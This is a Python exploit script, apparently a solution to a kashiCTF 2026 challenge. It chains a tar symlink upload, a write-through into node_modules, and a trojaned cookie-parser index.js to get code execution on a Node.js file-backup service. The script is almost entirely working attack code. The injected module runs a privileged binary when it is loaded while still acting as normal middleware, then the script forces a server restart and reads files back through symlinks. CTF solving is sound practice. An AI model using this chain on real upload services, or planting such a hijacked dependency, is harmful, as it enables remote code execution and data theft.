#!/usr/bin/env python3
"""
Cloud Backup - kashiCTF 2026 - Symlink write-through + module hijack RCE

Attack chain:
1. Upload tar symlink to /app/node_modules/cookie-parser/
2. Write malicious index.js through symlink (executes SUID /sayhi on require())
3. Write .node file to trigger nodemon restart
4. Re-register, symlink to /tmp/flag.txt, download flag
"""
import requests, tarfile, io, time, sys, os

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://34.126.223.46:19297"
s = requests.Session()

# --- Phase 1: Setup ---
user = f"rce_{int(time.time())}"
print(f"[1] Registering {user}...")
r = s.post(f"{BASE}/api/signup", json={"username": user, "password": "password123"}, timeout=10)
print(f"    {r.status_code}: {r.text[:60]}")

# --- Phase 2: Symlink to cookie-parser module dir ---
print("[2] Creating symlink to cookie-parser...")
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode='w:gz') as tar:
    info = tarfile.TarInfo(name='cp')
    info.type = tarfile.SYMTYPE
    info.linkname = '/app/node_modules/cookie-parser'
    tar.addfile(info)
buf.seek(0)
r = s.post(f"{BASE}/api/upload",
           files={"file": ("s.tar.gz", buf, "application/gzip")},
           data={"targetDir": ""}, timeout=10)
print(f"    {r.status_code}: {r.text[:80]}")

# --- Phase 3: Write malicious cookie-parser/index.js ---
# Executes /sayhi (SUID root) on require(), saves flag, exports working middleware
malicious = b'''
const { execSync } = require('child_process');
const fs = require('fs');

// Execute SUID binary to read /flag - runs at require() time during server startup
try {
  const flag = execSync('/sayhi').toString();
  try { fs.writeFileSync('/tmp/flag.txt', flag); } catch(e) {}
  try { fs.mkdirSync('/app/public', { recursive: true }); fs.writeFileSync('/app/public/flag.txt', flag); } catch(e) {}
} catch(e) {
  try { fs.writeFileSync('/tmp/flag_err.txt', e.message); } catch(e2) {}
}

// Export working cookie-parser so server doesn't break (req.cookies must be set)
module.exports = function(secret, options) {
  return function cookieParser(req, res, next) {
    if (req.cookies) return next();
    var cookies = {};
    var header = req.headers.cookie;
    if (header) {
      header.split(';').forEach(function(cookie) {
        var parts = cookie.split('=');
        var key = parts[0].trim();
        var val = parts.slice(1).join('=').trim();
        cookies[key] = decodeURIComponent(val);
      });
    }
    req.cookies = cookies;
    req.signedCookies = {};
    next();
  };
};
'''

print("[3] Writing malicious index.js through symlink...")
r = s.post(f"{BASE}/api/upload",
           files={"file": ("index.js", io.BytesIO(malicious), "application/javascript")},
           data={"targetDir": "cp"}, timeout=10)
print(f"    {r.status_code}: {r.text[:80]}")

# --- Phase 4: Trigger nodemon restart ---
# nodemonConfig has ignoreRoot:[".git"] which removes default node_modules ignore
# .node extension triggers restart
print("[4] Triggering nodemon restart via .node file...")
r = s.post(f"{BASE}/api/upload",
           files={"file": ("restart.node", io.BytesIO(b'x'), "application/octet-stream")},
           data={"targetDir": "cp"}, timeout=10)
print(f"    {r.status_code}: {r.text[:80]}")

# --- Phase 5: Wait for restart ---
print("[5] Waiting for server restart...")
time.sleep(10)

# --- Phase 6: Read the flag ---
# Try static path first (no auth needed)
print("[6] Reading flag...")
for path in ["/flag.txt", "/err.txt"]:
    try:
        r = requests.get(f"{BASE}{path}", timeout=5)
        if r.status_code == 200 and len(r.text) > 5 and "Cannot GET" not in r.text:
            print(f"    Static {path}: {r.text.strip()}")
            if "kashiCTF" in r.text:
                print(f"\n[FLAG] {r.text.strip()}")
                with open(os.path.join(os.path.dirname(__file__), "flag.txt"), "w") as f:
                    f.write(r.text.strip() + "\n")
                sys.exit(0)
    except:
        pass

# Fallback: read via symlink (needs auth, re-register since in-memory DB cleared on restart)
print("    Static read failed, trying symlink method...")
s2 = requests.Session()
user2 = f"read_{int(time.time())}"
r = s2.post(f"{BASE}/api/signup", json={"username": user2, "password": "password123"}, timeout=10)
print(f"    Re-register: {r.status_code}")

for name, target in [("fl", "/tmp/flag.txt"), ("er", "/tmp/flag_err.txt")]:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tar:
        info = tarfile.TarInfo(name=name)
        info.type = tarfile.SYMTYPE
        info.linkname = target
        tar.addfile(info)
    buf.seek(0)
    s2.post(f"{BASE}/api/upload",
            files={"file": ("t.tar.gz", buf, "application/gzip")},
            data={"targetDir": ""}, timeout=10)
    r2 = s2.get(f"{BASE}/api/download", params={"path": name}, timeout=10)
    if r2.status_code == 200 and not r2.text.startswith('{"error"'):
        print(f"    {target}: {r2.text.strip()}")
        if "kashiCTF" in r2.text:
            print(f"\n[FLAG] {r2.text.strip()}")
            with open(os.path.join(os.path.dirname(__file__), "flag.txt"), "w") as f:
                f.write(r2.text.strip() + "\n")
            sys.exit(0)

print("\n[!] Flag not found - check if instance is still alive")
